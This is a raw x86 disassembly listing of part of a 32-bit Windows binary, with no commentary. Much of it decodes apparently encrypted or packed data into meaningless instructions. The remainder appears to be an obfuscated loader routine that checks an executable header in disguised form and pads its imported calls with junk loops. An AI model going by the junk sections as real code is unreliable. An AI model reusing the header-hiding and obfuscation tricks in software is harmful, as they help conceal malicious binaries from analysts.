  40c4d0:	cmp    eax,0x66e237e9
  40c4d5:	aas    
  40c4d6:	jmp    0x40c510
  40c4d8:	push   0x69
  40c4da:	cmp    edx,esp
  40c4dc:	adc    BYTE PTR [edx-0x1b],dh
  40c4df:	inc    ebx
  40c4e0:	pop    ecx
  40c4e1:	sub    eax,0x7feb1cee
  40c4e6:	mov    ?,WORD PTR [ebp-0x1db53580]
  40c4ec:	ror    ebx,cl
  40c4ee:	jbe    0x40c4b6
  40c4f0:	mov    sp,0x327c
  40c4f4:	sub    cl,BYTE PTR [edi]
  40c4f6:	je     0x40c4e4
  40c4f8:	je     0x40c51d
  40c4fa:	(bad)  
  40c4fc:	fdivrp st(0),st
  40c4fe:	jp     0x40c491
  40c500:	popa   
  40c501:	mov    ebx,0x4392fbce
  40c506:	sbb    bl,al
  40c508:	not    BYTE PTR [ebx-0x42757c9b]
  40c50e:	loope  0x40c53e
  40c510:	daa    
  40c511:	sub    esp,esi
  40c513:	pop    ebp
  40c514:	clc    
  40c515:	sub    al,0xb8
  40c517:	adc    DWORD PTR [eax],ebp
  40c519:	jno    0x40c539
  40c51b:	or     DWORD PTR [edx],eax
  40c51d:	lods   eax,DWORD PTR ds:[esi]
  40c51e:	pop    ss
  40c51f:	add    BYTE PTR [ebx+0x42],dl
  40c522:	push   edx
  40c523:	in     al,dx
  40c524:	outs   dx,BYTE PTR ds:[esi]
  40c525:	jbe    0x40c534
  40c527:	iret   
  40c528:	leave  
  40c529:	popf   
  40c52a:	xor    al,0xd4
  40c52c:	sbb    ecx,DWORD PTR [esi]
  40c52e:	add    al,0x67
  40c530:	push   eax
  40c531:	mov    cl,0x1d
  40c533:	retf   
  40c534:	pop    es
  40c535:	mov    BYTE PTR [esp+ecx*2+0x30],dl
  40c539:	push   ebx
  40c53a:	and    esp,0x5952c0f0
  40c540:	in     eax,dx
  40c541:	sub    al,BYTE PTR [ebx+0x33225054]
  40c547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c548:	add    cl,BYTE PTR [esp+ecx*8+0x32aa1c39]
  40c54f:	dec    edx
  40c550:	gs push ebp
  40c552:	inc    ebx
  40c553:	cmp    cl,ch
  40c555:	xchg   edx,eax
  40c556:	mov    ebx,0x9fc40c59
  40c55b:	push   edx
  40c55c:	mov    esi,0x8a46652e
  40c561:	das    
  40c562:	hlt    
  40c563:	(bad)  
  40c564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c565:	dec    ebx
  40c566:	jl     0x40c53c
  40c568:	retf   0x4473
  40c56b:	jne    0x40c5ab
  40c56d:	jno    0x40c5d7
  40c56f:	sub    edi,DWORD PTR [ecx]
  40c571:	jnp    0x40c503
  40c573:	retf   0x68f5
  40c576:	push   cs
  40c577:	sbb    BYTE PTR [edi],0x0
  40c57a:	fisubr DWORD PTR [ebx-0x1cb9d599]
  40c580:	call   DWORD PTR [edi]
  40c582:	push   ss
  40c583:	cwde   
  40c584:	push   eax
  40c585:	jb     0x40c591
  40c587:	pop    ebp
  40c588:	inc    esi
  40c589:	mov    WORD PTR [ecx],?
  40c58b:	pop    edi
  40c58c:	fs push edi
  40c58e:	(bad)  
  40c58f:	out    dx,eax
  40c590:	fbstp  TBYTE PTR [ebx]
  40c592:	push   ebp
  40c593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c594:	(bad)  
  40c595:	popf   
  40c596:	cmp    BYTE PTR [ebx],ah
  40c598:	or     BYTE PTR [ebp-0x6e],dh
  40c59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c59c:	addr16 call 0xb9265327
  40c5a2:	jp     0x40c621
  40c5a4:	lods   eax,DWORD PTR ds:[esi]
  40c5a5:	ins    DWORD PTR es:[edi],dx
  40c5a6:	out    dx,al
  40c5a7:	test   ecx,esi
  40c5a9:	push   ebp
  40c5aa:	sti    
  40c5ab:	(bad)  
  40c5ac:	ds out 0x4c,eax
  40c5af:	loope  0x40c625
  40c5b1:	in     eax,0x13
  40c5b3:	loopne 0x40c60a
  40c5b5:	lea    ecx,[ebx]
  40c5b7:	sbb    eax,0x25fc0365
  40c5bc:	jo     0x40c556
  40c5be:	into   
  40c5bf:	pop    ebx
  40c5c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5c1:	pop    esp
  40c5c2:	sbb    BYTE PTR [ebp+ecx*8-0x570c2020],dl
  40c5c9:	(bad)  
  40c5cb:	les    esp,FWORD PTR [edx+0x54cf1c89]
  40c5d1:	mov    ds:0x425e78b5,al
  40c5d6:	pop    edi
  40c5d7:	jmp    0x64d5:0xf07c0d15
  40c5de:	retf   
  40c5df:	xor    esp,eax
  40c5e1:	dec    eax
  40c5e2:	jns    0x40c5bc
  40c5e4:	std    
  40c5e5:	xor    eax,0x874b1270
  40c5ea:	and    DWORD PTR [eax+0x5c0a3645],edx
  40c5f0:	je     0x40c591
  40c5f2:	call   FWORD PTR [eax+0x15]
  40c5f5:	mov    ah,0xe9
  40c5f7:	mov    ebp,0x61af00b0
  40c5fc:	into   
  40c5fd:	jnp    0x40c653
  40c5ff:	mov    bh,BYTE PTR [edx+0x573f8695]
  40c605:	mov    ecx,0x2c915247
  40c60a:	xchg   DWORD PTR [edi],esp
  40c60c:	repnz rcr BYTE PTR [edi],0x80
  40c610:	mov    esp,0x61563d63
  40c615:	sbb    eax,ecx
  40c617:	mov    eax,ds:0x49a073a8
  40c61c:	pop    ecx
  40c61d:	out    dx,al
  40c61e:	jae    0x40c62f
  40c620:	aaa    
  40c621:	xchg   ebx,eax
  40c622:	xchg   ebx,eax
  40c623:	repnz cmp DWORD PTR cs:[esi+0x22182b55],0xffffff96
  40c62c:	mov    dl,dl
  40c62e:	jl     0x40c679
  40c630:	pop    esi
  40c631:	sub    ecx,DWORD PTR [edi-0x42]
  40c634:	sub    edi,ebx
  40c636:	adc    al,0xeb
  40c638:	sub    eax,0x8bca81a7
  40c63d:	bound  ebx,QWORD PTR [edi]
  40c63f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c640:	scas   eax,DWORD PTR es:[edi]
  40c641:	push   cs
  40c642:	xchg   DWORD PTR [esi-0x4a],ebp
  40c645:	mov    edx,DWORD PTR ds:0xb75e6024
  40c64b:	inc    edx
  40c64c:	jmp    0x9365:0x8225d7c3
  40c653:	loope  0x40c657
  40c655:	xor    eax,ebp
  40c657:	mov    ds:0x158bcd47,eax
  40c65c:	aas    
  40c65d:	push   esp
  40c65e:	fcmovnb st,st(1)
  40c660:	push   es
  40c661:	inc    edx
  40c662:	cmp    esp,DWORD PTR [edi+0x200c3a11]
  40c668:	push   DWORD PTR [edx-0x6b]
  40c66b:	(bad)  
  40c66c:	jbe    0x40c6cd
  40c66e:	cmp    esi,ecx
  40c670:	int    0xe
  40c672:	retf   0x621e
  40c675:	ja     0x40c696
  40c677:	jle    0x40c62e
  40c679:	push   0x42
  40c67b:	sub    eax,0x6e62941
  40c680:	inc    edi
  40c681:	cmp    ah,BYTE PTR [ebp-0x38]
  40c684:	cmp    ch,BYTE PTR [eax]
  40c686:	sbb    al,0x69
  40c688:	xchg   ebp,eax
  40c689:	or     DWORD PTR [ecx],0x98464ae6
  40c68f:	retf   0x3c2d
  40c692:	(bad)
  40c695:	hlt    
  40c696:	rcr    BYTE PTR [eax+0x18c59df9],0xec
  40c69d:	add    eax,DWORD PTR [edx]
  40c69f:	xchg   esi,eax
  40c6a0:	es ret 0xd51b
  40c6a4:	shl    DWORD PTR [ebx+eiz*1+0x5528049b],cl
  40c6ab:	pop    edx
  40c6ac:	mov    al,0x27
  40c6ae:	out    0x53,ax
  40c6b1:	and    eax,0x33795895
  40c6b6:	jb     0x40c6bc
  40c6b8:	mov    bh,0x2e
  40c6ba:	pop    esp
  40c6bb:	hlt    
  40c6bc:	sbb    cl,BYTE PTR [ecx+ebx*1-0x7bfa77c1]
  40c6c3:	xor    eax,0xb427d43d
  40c6c8:	pop    esp
  40c6c9:	dec    edx
  40c6ca:	sub    DWORD PTR [esi],esi
  40c6cc:	fwait
  40c6cd:	xchg   ebx,eax
  40c6ce:	mov    al,ds:0xdf0e650c
  40c6d3:	test   eax,0x664b7475
  40c6d8:	out    dx,eax
  40c6d9:	pop    edi
  40c6da:	push   ebp
  40c6db:	push   edx
  40c6dc:	mov    ecx,0x403dbbda
  40c6e1:	lahf   
  40c6e2:	sbb    esp,DWORD PTR [ebp+0xf078598]
  40c6e8:	repnz adc DWORD PTR [eax-0x62],esp
  40c6ec:	pop    ecx
  40c6ed:	xchg   edi,ecx
  40c6ef:	call   FWORD PTR [ebp+eax*4+0x56a334ec]
  40c6f6:	ja     0x40c691
  40c6f8:	inc    ebx
  40c6f9:	mov    al,0x79
  40c6fb:	adc    ebp,DWORD PTR [ecx+0x50]
  40c6fe:	add    eax,0x2d713552
  40c703:	adc    eax,0x6c4e29e9
  40c708:	test   al,0xaa
  40c70a:	inc    ecx
  40c70b:	jmp    0x40c6a3
  40c70d:	iret   
  40c70e:	xor    eax,0xa9cadc95
  40c713:	dec    eax
  40c714:	cwde   
  40c715:	sub    bl,BYTE PTR [esi-0x711fe9d7]
  40c71b:	add    DWORD PTR ds:0xd9cea766,ecx
  40c721:	dec    edi
  40c722:	pop    esi
  40c723:	addr16 sbb cl,dl
  40c726:	sbb    BYTE PTR [esi-0x67],cl
  40c729:	cmc    
  40c72a:	data16 mov dl,0x1a
  40c72d:	cmp    DWORD PTR [edx],esi
  40c72f:	pop    ebp
  40c730:	std    
  40c731:	bound  eax,QWORD PTR ds:0x3b25c656
  40c737:	rcr    BYTE PTR [ebx+0x14b140c9],cl
  40c73d:	iret   
  40c73e:	sahf   
  40c73f:	outs   dx,BYTE PTR ds:[esi]
  40c740:	add    esi,DWORD PTR [ecx]
  40c742:	(bad)  
  40c744:	push   es
  40c745:	test   al,0x20
  40c747:	push   ss
  40c748:	pop    ss
  40c749:	int3   
  40c74a:	scas   al,BYTE PTR es:[edi]
  40c74b:	int3   
  40c74c:	retf   
  40c74d:	enter  0xf816,0x4f
  40c751:	fist   DWORD PTR [edx-0x26]
  40c754:	pop    es
  40c755:	std    
  40c756:	jns    0x40c6e8
  40c758:	jmp    0xca7a:0xc29b328a
  40c75f:	jns    0x40c70a
  40c761:	icebp  
  40c762:	stc    
  40c763:	cmp    dh,dl
  40c765:	jge    0x40c7df
  40c767:	sbb    DWORD PTR [edi+eiz*4-0x55],ecx
  40c76b:	into   
  40c76c:	adc    ch,ch
  40c76e:	jl     0x40c744
  40c770:	add    al,0x29
  40c772:	push   ebx
  40c773:	out    dx,al
  40c774:	retf   
  40c775:	out    dx,eax
  40c776:	popa   
  40c777:	mov    db0,esp
  40c77a:	cmc    
  40c77b:	shl    DWORD PTR [eax+ebp*1],cl
  40c77e:	and    eax,0x51d9ad23
  40c783:	adc    BYTE PTR [edx+0x2f],ch
  40c786:	jmp    0xcb42:0xdbc2ab05
  40c78d:	ret    0xb13c
  40c790:	inc    edx
  40c791:	push   cs
  40c792:	aam    0xe7
  40c794:	push   edx
  40c795:	or     al,0x84
  40c797:	sub    bl,BYTE PTR [eax+0x6535a228]
  40c79d:	mov    gs,ebx
  40c79f:	jbe    0x40c771
  40c7a1:	xchg   edi,eax
  40c7a2:	xchg   ebp,eax
  40c7a3:	scas   al,BYTE PTR es:[edi]
  40c7a4:	add    DWORD PTR [eax-0x4],edx
  40c7a7:	loop   0x40c79b
  40c7a9:	mov    eax,0x99fe4ce1
  40c7ae:	push   0x5bc7aa58
  40c7b3:	xor    BYTE PTR [ecx],ah
  40c7b5:	sahf   
  40c7b6:	xchg   ebp,eax
  40c7b7:	ret    
  40c7b8:	ins    BYTE PTR es:[edi],dx
  40c7b9:	add    eax,0x5b0aece
  40c7be:	mov    eax,ds:0x15f725a0
  40c7c4:	scas   eax,DWORD PTR es:[edi]
  40c7c5:	mov    dh,0x41
  40c7c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7c8:	pop    edi
  40c7c9:	and    BYTE PTR ss:[edx+0x16],dl
  40c7cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7ce:	ja     0x40c7fb
  40c7d0:	inc    ebx
  40c7d1:	lods   eax,DWORD PTR ds:[esi]
  40c7d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7d3:	inc    ebx
  40c7d4:	mov    al,ds:0xf84d8be7
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	mov    al,BYTE PTR [ebx-0x5]
  40c802:	ror    cl,0x82
  40c805:	jle    0x40c885
  40c807:	cs jge 0x40c888
  40c80a:	jle    0x40c884
  40c80c:	popa   
  40c80d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c80e:	fsub   QWORD PTR [esi]
  40c810:	xchg   edx,eax
  40c811:	mov    edi,0x19adbddb
  40c816:	lock pop esp
  40c818:	jb     0x40c84c
  40c81a:	jbe    0x40c899
  40c81c:	stc    
  40c81d:	mov    eax,ds:0x72486b41
  40c822:	je     0x40c7f4
  40c824:	push   es
  40c825:	dec    esi
  40c826:	mov    eax,ds:0xb61f09e1
  40c82b:	dec    eax
  40c82c:	imul   eax,DWORD PTR [edi-0x4e072ac8],0x7c0fd7f8
  40c836:	xor    eax,0x92e1fdd4
  40c83b:	sahf   
  40c83c:	sub    dh,ch
  40c83e:	aad    0x7f
  40c840:	push   es
  40c841:	in     eax,0xfc
  40c843:	dec    ebp
  40c844:	jns    0x40c8b6
  40c846:	loope  0x40c7fa
  40c848:	ss xchg esi,eax
  40c84a:	or     esp,DWORD PTR [ebx]
  40c84c:	ret    0xb6e
  40c84f:	in     eax,dx
  40c850:	cdq    
  40c851:	inc    ecx
  40c852:	inc    edx
  40c853:	popf   
  40c854:	mov    ds:0x2adfe5da,eax
  40c859:	les    esi,FWORD PTR [esi+eax*2+0x6e90a906]
  40c860:	arpl   WORD PTR [edi],si
  40c862:	push   edx
  40c863:	or     edi,DWORD PTR ds:0xe531b958
  40c869:	or     eax,ecx
  40c86b:	add    BYTE PTR [edi-0x29],ah
  40c86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c86f:	rcr    DWORD PTR [ebp+0x77bdfc71],1
  40c875:	jg     0x40c872
  40c877:	icebp  
  40c878:	lahf   
  40c879:	adc    ebp,DWORD PTR [edi-0x48]
  40c87c:	xchg   esp,eax
  40c87d:	jmp    0xf4f:0xbea23c82
  40c884:	sub    eax,DWORD PTR [eax-0x37ada850]
  40c88a:	stos   DWORD PTR es:[edi],eax
  40c88b:	inc    esi
  40c88c:	loop   0x40c82c
  40c88e:	mov    edx,0xb2449560
  40c893:	dec    ecx
  40c894:	jno    0x40c83e
  40c896:	ficomp DWORD PTR [ebp+0x77e9fad3]
  40c89c:	mov    bh,0x44
  40c89e:	jae    0x40c8d0
  40c8a0:	or     eax,0x380adfc4
  40c8a5:	mov    edi,0x57ea7963
  40c8aa:	adc    BYTE PTR [edx+0x58],al
  40c8ad:	and    edx,edi
  40c8af:	mov    edi,0x37065b68
  40c8b4:	push   0xca067bec
  40c8b9:	imul   ecx,DWORD PTR [edx-0x39],0x8bccb2f6
  40c8c0:	sbb    eax,DWORD PTR [edi-0x6b84572a]
  40c8c6:	mov    ?,ebp
  40c8c8:	mov    dl,0x6a
  40c8ca:	xor    bh,BYTE PTR [esi]
  40c8cc:	and    bh,BYTE PTR [esi+ebx*2-0x6a]
  40c8d0:	jne    0x40c92f
  40c8d2:	lods   eax,DWORD PTR ds:[esi]
  40c8d3:	in     al,0xa3
  40c8d5:	stos   DWORD PTR es:[edi],eax
  40c8d6:	push   0xb8597b53
  40c8db:	xchg   edx,eax
  40c8dc:	jae    0x40c8f2
  40c8de:	sbb    eax,0xae0d8b9e
  40c8e3:	jecxz  0x40c90c
  40c8e5:	xor    DWORD PTR ds:0xca196b09,edx
  40c8eb:	jns    0x40c919
  40c8ed:	mov    esi,edi
  40c8ef:	repnz bound esp,QWORD PTR [esi-0xeca79d8]
  40c8f6:	add    ecx,DWORD PTR [ebx+0x1a]
  40c8f9:	pop    esi
  40c8fa:	mov    ds:0x3fdbe621,eax
  40c8ff:	scas   eax,DWORD PTR es:[edi]
  40c900:	jb     0x40c981
  40c902:	jno    0x40c957
  40c904:	push   edi
  40c905:	ins    DWORD PTR es:[edi],dx
  40c906:	inc    edi
  40c907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c908:	add    BYTE PTR [eax+0x0],al
  40c90b:	xor    al,0xfa
  40c90d:	cld    
  40c90e:	clc    
  40c90f:	jecxz  0x40c924
  40c911:	dec    esi
  40c912:	out    0x38,al
  40c914:	call   DWORD PTR [ebx-0x226b3939]
  40c91a:	and    al,0x86
  40c91c:	lods   eax,DWORD PTR ds:[esi]
  40c91d:	jno    0x40c908
  40c91f:	mov    bh,0xe1
  40c921:	(bad)  
  40c922:	jae    0x40c98e
  40c924:	or     DWORD PTR [esi+ebx*1-0x724b0021],ebp
  40c92b:	pusha  
  40c92c:	and    DWORD PTR [ebp+0x4e22cf6d],ebx
  40c932:	retf   
  40c933:	add    ah,BYTE PTR [ecx-0x24c3a446]
  40c939:	loopne 0x40c94b
  40c93b:	and    BYTE PTR [eax],ah
  40c93d:	loop   0x40c8c6
  40c93f:	sti    
  40c940:	sub    eax,0x1583c4fe
  40c945:	dec    edx
  40c946:	xchg   BYTE PTR [edx+esi*4-0x6f311978],bl
  40c94d:	fmul   QWORD PTR [ebx-0x334becea]
  40c953:	inc    eax
  40c954:	dec    eax
  40c955:	lods   al,BYTE PTR ds:[esi]
  40c956:	cld    
  40c957:	mov    bh,0x64
  40c959:	mov    ds:0x903e01f,eax
  40c95f:	or     DWORD PTR [ebp+0x4db4e557],edi
  40c965:	arpl   WORD PTR [ebp-0x39],di
  40c968:	jmp    0x40c966
  40c96a:	retf   0x35f1
  40c96d:	fwait
  40c96e:	inc    ebx
  40c96f:	in     eax,dx
  40c970:	outs   dx,DWORD PTR ds:[esi]
  40c971:	mov    dl,0x8b
  40c973:	gs dec ebx
  40c975:	(bad)  
  40c976:	cmc    
  40c977:	mov    DWORD PTR [ebp-0x3d9e0c1a],edx
  40c97d:	xchg   esi,eax
  40c97e:	cwde   
  40c97f:	cmp    eax,0x4dce2f77
  40c984:	add    ch,BYTE PTR [ecx-0x62f14838]
  40c98a:	dec    ebp
  40c98b:	and    al,0xd7
  40c98d:	add    eax,0x97b1dc21
  40c992:	adc    BYTE PTR [eax],ch
  40c994:	push   ss
  40c995:	dec    esi
  40c996:	push   ds
  40c997:	call   0x69ac:0xdb128b60
  40c99e:	push   0xb0fb161a
  40c9a3:	fwait
  40c9a4:	pop    ebp
  40c9a5:	mov    dh,0xd6
  40c9a7:	pusha  
  40c9a8:	gs lock mov ebp,0x50a1a82b
  40c9af:	enter  0x1cd2,0x56
  40c9b3:	cmp    eax,0xdd5557cd
  40c9b8:	imul   edi,DWORD PTR [ebp-0x2d1bf806],0x56ae9076
  40c9c2:	mov    eax,ds:0xbb31b00b
  40c9c7:	cdq    
  40c9c8:	mov    bl,ah
  40c9ca:	adc    eax,0x3ae6f787
  40c9cf:	loope  0x40c9c2
  40c9d1:	cmp    eax,0xfa2a1b7e
  40c9d6:	xor    ecx,DWORD PTR [edx-0x265d22c8]
  40c9dc:	dec    ecx
  40c9dd:	icebp  
  40c9de:	scas   eax,DWORD PTR es:[edi]
  40c9df:	call   0x76baff45
  40c9e4:	adc    al,0x74
  40c9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e7:	jo     0x40ca07
  40c9e9:	pop    ebp
  40c9ea:	jge    0x40ca49
  40c9ec:	mov    cl,0x18
  40c9ee:	jo     0x40ca0c
  40c9f0:	push   es
  40c9f1:	lahf   
  40c9f2:	call   0x9aaa6db4
  40c9f7:	jnp    0x40ca12
  40c9f9:	fsubp  st(2),st
  40c9fb:	icebp  
  40c9fc:	and    edx,eax
  40c9fe:	push   ds
  40c9ff:	jns    0x40ca48
  40ca01:	jge    0x40ca41
  40ca03:	lahf   
  40ca04:	adc    BYTE PTR [eax+esi*1-0x282db1c5],0xdc
  40ca0c:	ror    ebp,1
  40ca0e:	shr    DWORD PTR ds:0xb0a70136,cl
  40ca14:	in     eax,0x23
  40ca16:	jmp    0x26ff1cac
  40ca1b:	popa   
  40ca1c:	inc    esi
  40ca1d:	bound  esi,QWORD PTR [esi-0x77267aed]
  40ca23:	mov    ds:0x582939ac,eax
  40ca28:	mov    edi,0xe7c0286a
  40ca2d:	and    BYTE PTR [esi],0x6e
  40ca30:	mov    ecx,0xefe1302b
  40ca35:	jno    0x40caae
  40ca37:	sti    
  40ca38:	imul   eax,DWORD PTR ds:0xf219181a,0xf42f72e3
  40ca42:	lds    ebx,FWORD PTR [ebp-0x67]
  40ca45:	pop    eax
  40ca46:	das    
  40ca47:	xor    ebx,ecx
  40ca49:	popf   
  40ca4a:	loope  0x40c9d6
  40ca4c:	popf   
  40ca4d:	push   edx
  40ca4e:	mov    WORD PTR [edx+esi*8],ss
  40ca51:	imul   ax,WORD PTR [eax-0x34],0x23
  40ca56:	ficomp WORD PTR [esi-0x78]
  40ca59:	or     BYTE PTR [esi-0x7d13631b],bh
  40ca5f:	fild   WORD PTR [edx-0x54796d48]
  40ca65:	push   0xa38bab9c
  40ca6a:	leave  
  40ca6b:	mov    BYTE PTR [esi],ah
  40ca6d:	adc    eax,edi
  40ca6f:	ja     0x40ca4a
  40ca71:	push   ds
  40ca72:	out    dx,eax
  40ca73:	sub    al,0xc0
  40ca75:	clc    
  40ca76:	push   esi
  40ca77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca78:	in     eax,0x93
  40ca7a:	ja     0x40ca13
  40ca7c:	fdiv   st,st(4)
  40ca7e:	push   ebp
  40ca7f:	shl    BYTE PTR [ebx+eax*4-0x5c],cl
  40ca83:	push   esi
  40ca84:	clc    
  40ca85:	aas    
  40ca86:	fist   DWORD PTR [esi+0x72ce4417]
  40ca8c:	popa   
  40ca8d:	iret   
  40ca8e:	call   FWORD PTR ds:0x2887
  40ca93:	int    0xd2
  40ca95:	add    al,0x5f
  40ca97:	sbb    al,0x5f
  40ca99:	cmp    dh,ch
  40ca9b:	adc    eax,0xf4981a71
  40caa0:	pop    edi
  40caa1:	cwde   
  40caa2:	cld    
  40caa3:	jo     0x40caf5
  40caa5:	mov    al,ds:0x98f9dd1b
  40caaa:	pop    edx
  40caab:	add    BYTE PTR [edi+0x1c],ah
  40caae:	bswap  eax
  40cab0:	sbb    ebx,DWORD PTR [ecx-0x3a0388e]
  40cab6:	fidivr DWORD PTR [esi-0x2a]
  40cab9:	jo     0x40cb2c
  40cabb:	cdq    
  40cabc:	shr    dl,cl
  40cabe:	dec    eax
  40cabf:	repnz mov eax,ds:0xc5262200
  40cac5:	push   es
  40cac6:	inc    esi
  40cac7:	ror    DWORD PTR [edi],0xaf
  40caca:	ja     0x40cae7
  40cacc:	mov    dh,0xec
  40cace:	mov    WORD PTR ds:0x783a76f8,ss
  40cad4:	and    DWORD PTR [ecx-0x6193c083],esi
  40cada:	pop    ebx
  40cadb:	cmp    DWORD PTR [eax],esi
  40cadd:	add    eax,0xbf91fb39
  40cae2:	pop    ss
  40cae3:	pushf  
  40cae4:	js     0x40caed
  40cae6:	aaa    
  40cae7:	sahf   
  40cae8:	xor    al,0x1c
  40caea:	cmp    al,ah
  40caec:	cdq    
  40caed:	ins    DWORD PTR es:[edi],dx
  40caee:	popf   
  40caef:	bound  ebp,QWORD PTR [esi-0x6c]
  40caf2:	out    dx,eax
  40caf3:	pusha  
  40caf4:	jno    0x40cae8
  40caf6:	cmp    DWORD PTR [ebp+eax*4+0x2a],0x96291baa
  40cafe:	xchg   BYTE PTR [ecx-0x6b],cl
  40cb01:	ror    DWORD PTR [ecx-0x3e53bdd6],1
  40cb07:	inc    esi
  40cb08:	xchg   edx,eax
  40cb09:	pop    ebp
  40cb0a:	or     eax,0xbe1b403e
  40cb0f:	ins    BYTE PTR es:[edi],dx
  40cb10:	repz shl BYTE PTR [eax-0x55],0x1b
  40cb15:	lea    edi,[edx+0x43c21728]
  40cb1b:	loopne 0x40cabb
  40cb1d:	mov    bh,0xf6
  40cb1f:	ins    DWORD PTR es:[edi],dx
  40cb20:	push   eax
  40cb21:	leave  
  40cb22:	(bad)  
  40cb23:	lea    edi,[edx]
  40cb25:	int3   
  40cb26:	retf   0x975b
  40cb29:	add    al,0xb2
  40cb2b:	test   BYTE PTR ds:0x591c29c6,ch
  40cb31:	mov    BYTE PTR [esi-0x5b],ah
  40cb34:	retf   
  40cb35:	push   0xf9dd90f7
  40cb3a:	fimul  DWORD PTR [ebx-0x39cc1fb3]
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x430455,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x430455
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x430455,eax
  40cbe0:	cmp    DWORD PTR ds:0x430455,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x430455,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42ea0b
  40cc05:	cmp    DWORD PTR ds:0x430455,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x430455
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x430455,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x43043d,0x0
  40cc2f:	mov    eax,ds:0x43043d
  40cc34:	inc    eax
  40cc35:	mov    ds:0x43043d,eax
  40cc3a:	cmp    DWORD PTR ds:0x43043d,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e917
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42eacb
  40cc6b:	cmp    DWORD PTR ds:0x43043d,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
